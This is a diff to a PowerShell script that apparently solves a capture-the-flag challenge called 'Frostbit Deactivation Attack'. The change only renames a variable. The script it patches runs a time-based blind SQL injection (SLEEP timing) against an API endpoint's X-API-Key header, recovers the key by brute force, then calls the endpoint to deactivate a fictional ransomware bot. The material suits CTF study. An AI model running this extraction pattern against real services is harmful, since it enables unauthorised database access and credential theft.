@@ -120,7 +120,6 @@ if(-not (Is-UUID -InputString $BotUUID)){
     "Error badly formatted BotUUID, you can find yours in the decrypted TLS HTTP pcap data and the frostbit_core_dump file."
     return
 }
-else{$botuuid = $BotUUID}
 
 if($SQLSleepTimeSeconds -and ($SQLSleepTimeSeconds -ge 0.5 -and $SQLSleepTimeSeconds -le 2.0)){
     $sleepytime = $SQLSleepTimeSeconds
@@ -146,7 +145,7 @@ $session.UserAgent = "Mozilla/5.0"
 $totalops = 0
 $len = 0
 
-"Starting Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
+"Starting Frostbit Deactivation Attack for BotUUID $BotUUID and SQLi SLEEP($sleepytime) on $(Get-Date)"
 
 # If key-candidates.txt exists try brute-forcing the key name search with the list of possible key names.
 # One key name per line.  Add known names such as: _id, _key, along with unknowns such as: blah, frostbit, etc.
@@ -159,7 +158,7 @@ if(Test-Path -Path key-candidates.txt){
 
         $sw = [Diagnostics.Stopwatch]::StartNew()
 
-        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
+        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
         -WebSession $session `
         -SkipHttpErrorCheck `
         -Headers @{
@@ -184,7 +183,7 @@ foreach($i in 0..64){
 
     $sw = [Diagnostics.Stopwatch]::StartNew()
 
-    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
+    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
     -WebSession $session `
     -SkipHttpErrorCheck `
     -Headers @{
@@ -205,7 +204,7 @@ foreach($i in 0..64){
 
     $sw = [Diagnostics.Stopwatch]::StartNew()
 
-    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
+    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
     -WebSession $session `
     -SkipHttpErrorCheck `
     -Headers @{
@@ -227,7 +226,7 @@ foreach($i in 0..64){
 
     $sw = [Diagnostics.Stopwatch]::StartNew()
 
-    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
+    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
     -WebSession $session `
     -SkipHttpErrorCheck `
     -Headers @{
@@ -252,7 +251,7 @@ foreach($pos in 0..$len){
 
         $sw = [Diagnostics.Stopwatch]::StartNew()
 
-        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
+        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
         -WebSession $session `
         -SkipHttpErrorCheck `
         -Headers @{
@@ -276,7 +275,7 @@ foreach($i in 0..64){
 
     $sw = [Diagnostics.Stopwatch]::StartNew()
 
-    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
+    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
     -WebSession $session `
     -SkipHttpErrorCheck `
     -Headers @{
@@ -300,7 +299,7 @@ foreach($pos in 0..$len){
 
         $sw = [Diagnostics.Stopwatch]::StartNew()
 
-        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
+        $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
         -WebSession $session `
         -SkipHttpErrorCheck `
         -Headers @{
@@ -321,8 +320,8 @@ if($Deactivate){
     $apikey = $value
     "`nAttempting to deactivate the ransomware infrastructure from publishing our data:"
     "Setting HTTP header X-API-Key: $apikey"
-    "Sending GET request to https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true"
-    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$botuuid/deactivate?debug=true" `
+    "Sending GET request to https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true"
+    $resp = (Invoke-WebRequest -UseBasicParsing -Uri "https://api.frostbit.app/api/v1/frostbitadmin/bot/$BotUUID/deactivate?debug=true" `
     -WebSession $session `
     -SkipHttpErrorCheck `
     -Headers @{
@@ -335,6 +334,6 @@ else{
     "Add the '-Deactivate' switch to automatically deactivate the publication of the naughty_nice_list.csv file"
 }
 $swtotal.Stop()
-"`nCompleted Frostbit Deactivation Attack for BotUUID $botuuid and SQLi SLEEP($sleepytime) on $(Get-Date)"
+"`nCompleted Frostbit Deactivation Attack for BotUUID $BotUUID and SQLi SLEEP($sleepytime) on $(Get-Date)"
 "Deactivation Attack took $($swtotal.Elapsed.Minutes) minutes, $($swtotal.Elapsed.Seconds) seconds."
 "Total request operations: " + $totalops
